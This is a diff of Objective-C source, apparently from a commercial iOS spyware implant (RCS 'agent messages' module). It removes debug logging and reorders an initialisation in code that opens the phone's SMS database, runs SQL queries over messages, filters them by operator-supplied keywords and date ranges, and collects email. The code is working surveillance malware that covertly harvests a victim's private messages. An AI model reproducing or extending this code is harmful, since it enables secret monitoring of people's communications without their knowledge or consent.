@@ -214,19 +214,13 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
   
   if (agentDict == nil) 
     {
-#ifdef DEBUG
-      NSLog(@"_getAgentMessagesProperty: getting prop failed!");
-#endif
+      [outerPool release];
       return YES;
     }
   
   // SMS
   NSArray *filterArray = [agentDict objectForKey: @"SMS"];
-  
-#ifdef DEBUG
-  NSLog(@"_getAgentMessagesProperty: found %d filterProp", [filterArray count]);
-#endif
-  
+
   for (int i=0; i<[filterArray count]; i++) 
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
@@ -254,12 +248,7 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
   NSArray *filterMailArray = [agentDict objectForKey: @"MAIL"];
   
   if (filterMailArray != nil) 
-    {
-    
-#ifdef DEBUG
-      NSLog(@"_getAgentMessagesProperty: found %d filterProp", [filterMailArray count]);
-#endif
-  
+    { 
       for (int i=0; i<[filterMailArray count]; i++) 
         {
           NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
@@ -283,15 +272,7 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
           [innerPool release];
         }
     }
-  
-#ifdef DEBUG
-  NSDate *r = [NSDate dateWithTimeIntervalSince1970: mLastRealTimeMail];
-  NSDate *f = [NSDate dateWithTimeIntervalSince1970: mFirstCollectorMail];
-  NSDate *l = [NSDate dateWithTimeIntervalSince1970: mLastCollectorMail];
-  NSLog(@"%s: filters mFirstCollectorMail %@ (%d) mLastCollectorMail %@ (%d) mLastRealTimeMail %@ (%d)", 
-        __FUNCTION__, f, mFirstCollectorMail, l, mLastCollectorMail, r, mLastRealTimeMail);
-#endif 
-  
+   
   [outerPool release];
   
   return YES;
@@ -852,19 +833,11 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
   NSString      *subject;
   NSString      *to;
   time_t        unixTime,curr_rowid;
-  //char          sql_query_all[] = "select date,address,text,flags,datetime(date, 'unixepoch') from message";
   char          sql_query_all[] = "select date,address,text,flags,ROWID from message";
-//#if (TARGET_IPHONE)
   char          sql_db_name[] = SMS_DB_IPHONE_OS;
-//#else
-//  char          sql_db_name[] = SMS_DB_SIMULATOR;
-//#endif
+
   NSRange range;
   BOOL bFound = YES;
-  
-#ifdef DEBUG
-  NSLog(@"_smsWithKeyWords: database %s", sql_db_name);
-#endif
   
   if (msgFilter == COLLECT_FILTER_TYPE) 
     {
@@ -884,42 +857,20 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
               "select date,address,text,flags,ROWID from message where ROWID > %ld", 
               fromDate);
     }
-
-#ifdef DEBUG
-  NSLog(@"%s: running query %s.", __FUNCTION__, sql_query_curr);
-#endif 
-  
+ 
   if (sqlite3_open(sql_db_name, &db))
     {
-#ifdef DEBUG
-      NSLog(@"_smsWithKeyWords: Error on opening db: %s", sql_db_name);
-#endif
       return NO;
     }
-
-#ifdef DEBUG
-  NSLog(@"_smsWithKeyWords: database opened");
-#endif
   
   // running the query
   ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
-
-#ifdef DEBUG
-  NSLog(@"_smsWithKeyWords: query executed");
-#endif
-  
+ 
   // Close as soon as possible
   sqlite3_close(db);
   
-#ifdef DEBUG
-  NSLog(@"_smsWithKeyWords: database closed");
-#endif
-  
   if (ret != SQLITE_OK)
     {
-#ifdef DEBUG
-      NSLog(@"_smsWithKeyWords: Error on running query: %s", szErr);
-#endif
       return NO;
     }
   
@@ -929,11 +880,7 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
       for (i = 0; i< nrow * ncol; i += 5)
         {
           NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-        
-#ifdef DEBUG       
-//          NSLog(@"_smsWithKeyWords: Date: |%s| Flags: | %s [%d]| From/to: |%s| Message: |%s|\n", 
-//                result[ncol + i + 4], result[ncol + i + 3], flags, result[ncol + i + 1], result[ncol + i + 2]);
-#endif        
+    
           // Body of the sms: will be encapsed in the sujbect_field
           subject = [NSString stringWithUTF8String: result[ncol + i + 2]];
         
@@ -949,10 +896,6 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
               bFound = NO;
               
               NSString *key = (NSString *)[keyWords objectAtIndex: i];
-            
-#ifdef DEBUG
-              NSLog(@"%s: run filter on key %@", key);
-#endif
               
               NSRange found = [subject rangeOfString: key 
                                              options: NSCaseInsensitiveSearch 
@@ -962,10 +905,7 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
             if (found.location == NSNotFound) 
                 continue;
               else 
-                {
-#ifdef DEBUG
-                  NSLog(@"_smsWithKeyWords: matching with %@ found", key);
-#endif     
+                { 
                   bFound = YES;
                   break;
                 }
@@ -982,8 +922,6 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
               // last real time date not set yet: 
               //   we force it to current last messate datetime
               // XXX No more: we have lastCollector date on console now!
-              // if(mLastRealTimeSMS < mLastCollectorSMS)
-              //   mLastRealTimeSMS = mLastCollectorSMS;
               if (mLastRealTimeSMS < curr_rowid) 
                 {
                   mLastRealTimeSMS = curr_rowid;
@@ -1003,14 +941,7 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
                     mSMS--;
                 }
             }
-        
-#ifdef DEBUG
-          NSLog(@"%s: update prop FirstCollector %@, LastCollector %@, LastRealTime %d",
-                __FUNCTION__,
-                [NSDate dateWithTimeIntervalSince1970: mFirstCollectorSMS], 
-                [NSDate dateWithTimeIntervalSince1970: mLastCollectorSMS], 
-                mLastRealTimeSMS);
-#endif         
+               
           // keyWords not matching... processing next message
           if (bFound == NO) 
             { 
@@ -1031,10 +962,6 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
               // not set
               if (to == nil) 
                 to = [NSString stringWithCString: "local" encoding: NSUTF8StringEncoding];
-#ifdef DEBUG
-              NSLog(@"%s: flags %d from %@ to %@, subject %@.",
-                    __FUNCTION__, flags, from, to, subject);
-#endif 
             }
           else 
             {
@@ -1044,10 +971,6 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
               // not set
               if (from == nil) 
                 from = [NSString stringWithCString: "local" encoding: NSUTF8StringEncoding];
-#ifdef DEBUG
-            NSLog(@"%s: flags %d from %@ to %@",
-                  __FUNCTION__, flags, from, to);
-#endif 
             }
           
           // unixtime to filetime for datetime_field
@@ -1101,10 +1024,6 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
     }
   else
     {
-#ifdef DEBUG
-      NSLog(@"%s: no result in dataset", __FUNCTION__);
-#endif
-      // if query return no entries
       return NO;
     }
 }
@@ -1115,12 +1034,7 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
   NSEnumerator   *enumeratorCfg;
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-#ifdef DEBUG
-  NSLog(@"_getMessagesWithFilter: getting messages for filter %@ and type %@",
-        msgFilter == COLLECT_FILTER_TYPE ? @"COLLECT_FILTER_TYPE":@"REALTIME_FILTER_TYPE",
-        msgType   == SMS_TYPE ? @"SMS_TYPE" : @"MMS_TYPE");
-#endif
+
   
   enumeratorCfg = [[[mMessageFilters copy] autorelease] objectEnumerator];
   
@@ -1134,10 +1048,6 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
         {    
           long maxMsgSize = [[anObject objectForKey: @"maxMessageSize"] longValue];
 
-#ifdef DEBUG
-          NSLog(@"%s: mail - apply filter %@", __FUNCTION__, anObject);
-#endif
-
           if (msgFilter == COLLECT_FILTER_TYPE)
             {
               long fromDate   = [[anObject objectForKey: @"fromDate"] longValue];
@@ -1148,16 +1058,6 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
                 {
                   mFirstCollectorMail = fromDate;
                   mLastCollectorMail  = toDate;
-
-#ifdef DEBUG
-                NSLog(@"%s: run COLLECT_FILTER_TYPE fromDate = %x, toDate = %x (max %x)", __FUNCTION__, fromDate, toDate, LONG_MAX);
-                NSDate *f = [NSDate dateWithTimeIntervalSince1970: mFirstCollectorMail];
-                NSDate *t = [NSDate dateWithTimeIntervalSince1970: mLastCollectorMail];
-                NSDate *m = [NSDate dateWithTimeIntervalSince1970: LONG_MAX];
-                
-                NSLog(@"%s: running filter from date %@ to date %@ (max %@) max size %d",
-                      __FUNCTION__, f, t, m, maxMsgSize);
-#endif
                 
                   [self _mailWithMessageSize: maxMsgSize 
                                   withFilter: msgFilter 
@@ -1170,14 +1070,6 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
             {
               if (msgFilter == REALTTIME_FILTER_TYPE)
                 {
-#ifdef DEBUG
-                NSDate *f = [NSDate dateWithTimeIntervalSince1970: mFirstCollectorMail];
-                NSDate *t = [NSDate dateWithTimeIntervalSince1970: mLastCollectorMail];
-                NSDate *m = [NSDate dateWithTimeIntervalSince1970: LONG_MAX];
-                
-                NSLog(@"%s: running REALTTIME_FILTER_TYPE filter from date %@ to date %@ (max %@) max size %d",
-                      __FUNCTION__, f, t, m, maxMsgSize);
-#endif
                   if ([self _mailWithMessageSize: maxMsgSize 
                                       withFilter: msgFilter 
                                         fromDate: mLastRealTimeMail
@@ -1201,9 +1093,6 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
             }
         }     
     
-//      if(msgType == SMS_TYPE &&
-//         [[anObject objectForKey: @"filterType"] intValue]  == msgFilter &&
-//         [[anObject objectForKey: @"messageType"] intValue] == msgType)
       if([[anObject objectForKey: @"filterType"] intValue]  == msgFilter &&
          [[anObject objectForKey: @"messageType"] intValue] == SMS_TYPE)
         {    
@@ -1213,69 +1102,27 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
             {
               long fromDate  = [[anObject objectForKey: @"fromDate"] longValue];
               long toDate    = [[anObject objectForKey: @"toDate"] longValue];
-              //BOOL bRunQuery = NO;
-#ifdef DEBUG
-              char * firstS = asctime(gmtime((time_t *)&mFirstCollectorSMS));
-              char * fromS  = asctime(gmtime((time_t *)&fromDate));  
-              NSLog(@"_getMessagesWithFilter: COLLECT_FILTER_TYPE change mFirstCollectorSMS = %s (%ld) with %s (%ld)", 
-                    firstS, mFirstCollectorSMS, fromS, fromDate);
-
-              char * lastS = asctime(gmtime((time_t *)&mLastCollectorSMS));
-              char * toS   = asctime(gmtime((time_t *)&toDate));
-              NSLog(@"_getMessagesWithFilter: COLLECT_FILTER_TYPE change mLastCollectorSMS = %s (%ld) with %s (%ld)", 
-                    lastS, mLastCollectorSMS, toS, toDate);
-#endif            
+           
               // Running collector filter if:
               //  - very first time agent starting (mFirstCollectorSMS=ALL_MSG)
               //  - new filter conf with date < mFirstCollectorSMS
-              //  (if collector filter is present fromDate is mandatory > 0)
-//              if ((mFirstCollectorSMS != fromDate && fromDate > ALL_MSG) ||
-//                  (mFirstCollectorSMS == ALL_MSG && fromDate > ALL_MSG) ||
-//                  (mLastCollectorSMS < toDate && toDate > ALL_MSG)      ||
-//                  (mLastCollectorSMS == ALL_MSG && toDate > ALL_MSG)) 
-                if ((mFirstCollectorSMS != fromDate && fromDate > ALL_MSG) ||
-                     mLastCollectorSMS  != toDate) 
+              //  (if collector filter is present fromDate is mandatory > 0) 
+              if ((mFirstCollectorSMS != fromDate && fromDate > ALL_MSG) ||
+                   mLastCollectorSMS  != toDate) 
                 {
-#ifdef DEBUG
-                  NSDate *dFr = [NSDate dateWithTimeIntervalSince1970: fromDate];
-                  NSDate *dTo = [NSDate dateWithTimeIntervalSince1970: toDate];
-                            
-                  NSLog(@"%s: COLLECT_FILTER_TYPE fromDate = %@ toDate = %@", __FUNCTION__, dFr, dTo);
-#endif
                   mFirstCollectorSMS = fromDate;
                   mLastCollectorSMS  = toDate;
-                  //bRunQuery = YES;
+
                   [self _smsWithKeyWords: keyWords 
                               withFilter: msgFilter 
                                 fromDate: mFirstCollectorSMS
                                   toDate: mLastCollectorSMS];
                 }
-           
-//              if ((mLastCollectorSMS < toDate && toDate > ALL_MSG) ||
-//                  (mLastCollectorSMS == ALL_MSG && toDate > ALL_MSG)) 
-//                {
-//                  NSLog(@"_getMessagesWithFilter: COLLECT_FILTER_TYPE changed mLastCollectorSMS");
-//                  mFirstCollectorSMS = fromDate;
-//                  mLastCollectorSMS  = toDate;
-//                  bRunQuery = YES;
-//                }
-                  
-              // run the query
-//              if (bRunQuery)
-//                [self _smsWithKeyWords: keyWords 
-//                            withFilter: msgFilter 
-//                              fromDate: mFirstCollectorSMS
-//                                toDate: mLastCollectorSMS];
-                
             }
           else 
             {
               if (msgFilter == REALTTIME_FILTER_TYPE)
                 {
-#ifdef DEBUG
-                  NSLog(@"%s: REALTTIME_FILTER_TYPE mLastRealTimeSMS = %d", __FUNCTION__,
-                        mLastRealTimeSMS);
-#endif
                   if ([self _smsWithKeyWords: keyWords 
                                   withFilter: msgFilter 
                                     fromDate: mLastRealTimeSMS
@@ -1304,10 +1151,6 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
   
   [outerPool release];
 
-#ifdef DEBUG
-  NSLog(@"_getMessagesWithFilter: done");
-#endif
-  
   return YES;
 } 
 
@@ -1843,6 +1686,8 @@ NSString *kRCSIAgentMessageskRunLoopMode = @"kRCSIAgentMessageskRunLoopMode";
       return;
     }
   
+  mMessageFilters = [[NSMutableArray alloc] initWithCapacity: 0];
+  
   messageRawData = [self mAgentConfiguration];
   
   if([self _parseJsonConfWithData: messageRawData] == NO || [self isThreadCancelled] == TRUE)
@@ -1851,8 +1696,6 @@ NSString *kRCSIAgentMessageskRunLoopMode = @"kRCSIAgentMessageskRunLoopMode";
       [outerPool release];
       return;
     }
- 
-  mMessageFilters = [[NSMutableArray alloc] initWithCapacity: 0];
 
   [self _getAgentMessagesProperty];
   
